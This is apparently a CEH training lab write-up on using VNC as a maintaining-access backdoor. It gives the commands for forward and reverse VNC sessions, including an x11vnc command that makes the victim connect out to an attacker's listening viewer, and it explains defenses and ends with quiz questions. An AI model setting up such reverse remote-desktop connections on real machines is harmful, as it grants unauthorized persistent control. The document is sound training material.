VNC as a Backdoor

Overview — what this lab is really teaching

VNC gives you a remote graphical desktop — a perfectly legitimate admin tool. This lab shows the flip side: the same software, left in place on a compromised machine, is a backdoor that hands an attacker full GUI control. It's a maintaining-access technique in Module 6: System Hacking.

The sharper idea is the reverse VNC connection: instead of the attacker dialing in to the victim, the victim's VNC server connects out to a viewer the attacker is running. Just like a reverse shell, it slips past inbound firewall rules — and points at the same defenses.

The environment you're working in

You run a VNC server and viewer across two pod machines. VNC numbers its sessions by display (:1, :2, …), and each display maps to a TCP port (5900 + display, so :2 is 5902). Keeping display-vs-port straight avoids most of the confusion.

Command walkthrough

Read this before you copy anything

The source PDF uses en-dashes in some flags (–kill, –listen). Retype them as hyphens, or use the copy buttons.

Task 1 — Normal VNC

🦎 On OpenSUSE

1 Start, list, and stop a server

root@kali:~# vncserver :2
root@kali:~# vncserver -list
root@kali:~# vncserver -kill :2

vncserver :2 starts a desktop on display 2 (port 5902); -list shows running sessions; -kill :2 stops it. This is exactly how an admin would use it — and exactly what an attacker leaves running.

🐉 On Kali

2 Connect with a viewer

root@kali:~# vncviewer

Point the viewer at HOST:2 (or HOST:5902) and you're looking at that desktop. In the forward direction, the viewer connects to the server — which means the server's port has to be reachable through any firewall.

Task 2 — Reverse VNC

🦎 On OpenSUSE

3 Turn the connection around

First stop the forward session on the victim (vncserver -kill :2). Then the attacker's viewer listens on Kali (it waits on port 5500):

root@kali:~# vncviewer -listen 0

Now the victim connects out to that listener. On OpenSUSE, the lab runs x11vnc and points it at Kali's listening viewer:

osboxes:~ # cd /usr/bin
osboxes:~ # ./x11vnc -connect 192.168.9.2:5500

Because the victim initiates the outbound connection to 192.168.9.2:5500, it bypasses firewall rules that would have blocked an inbound viewer — the reverse-connection trick again. That's what turns remote-admin software into a stealthy backdoor: the attacker's listener sits outside the firewall and the victim inside dials out to it.

Reference — beyond the lab

Reverse connectionServer → viewer (vncviewer -listen, port 5500) — beats inbound firewalls
FlavorsTightVNC, RealVNC, UltraVNC, TigerVNC, x11vnc
VNC's built-in crypto is weak

Classic VNC authentication is limited and traffic is often unencrypted. Legitimate use tunnels VNC over SSH or a VPN — which is also why unencrypted VNC on the wire is a red flag for defenders.

The defender's view

Unauthorized remote-access software is the threat

VNC isn't malicious — unapproved remote access is. The defenses are about controlling and detecting that, and about denying the reverse connection.

  • Application allow-listing — if an unapproved VNC server can't run, there's no backdoor.
  • Egress filtering — blocks the reverse connection (and odd outbound to VNC ports).
  • Monitor for remote-access tools and listeners — EDR flags unexpected VNC/RDP/remote-control software and new listening ports.
  • Gate legitimate remote access — behind a VPN with MFA; tunnel VNC over SSH; never expose it raw.
  • Network segmentation — limit where a remote session can reach.

CEH v13 exam relevance

Maintaining-access technique in Module 6: System Hacking. High-yield facts:

  • Remote-access software as a backdoor (VNC, RDP, RATs) and the "living off legitimate tools" idea.
  • Reverse connections and why they defeat inbound firewall rules.

  • Defenses: allow-listing, egress filtering, remote-access monitoring, MFA-gated VPN.

Check yourself

1. VNC display :2 listens on which TCP port?

5902 — the port is 5900 + display number.

2. In a reverse VNC connection, who listens and who connects?

The attacker's viewer listens (vncviewer -listen); the victim's server connects out to it — which is how it bypasses inbound firewall rules.

3. Why is "VNC is a legitimate tool" not a reason to ignore it on an endpoint?

Attackers abuse legitimate remote-access software for persistence. What matters is whether it's authorized — unapproved remote access is the threat.

4. Name two controls that stop a reverse-VNC backdoor.

Any two: application allow-listing, egress filtering, remote-access/listener monitoring (EDR), network segmentation.

Cheat sheet

VNC basics

  • vncserver :2 — start (port 5902)
  • vncserver -list · vncserver -kill :2
  • vncviewer HOST:2 — connect
  • vncviewer -listen — reverse (attacker side)
  • Port = 5900 + display

Defense

  • Application allow-listing
  • Egress filtering (stops reverse)
  • Monitor remote-access tools / listeners
  • Legit use: VPN + MFA, tunnel over SSH
  • Segmentation
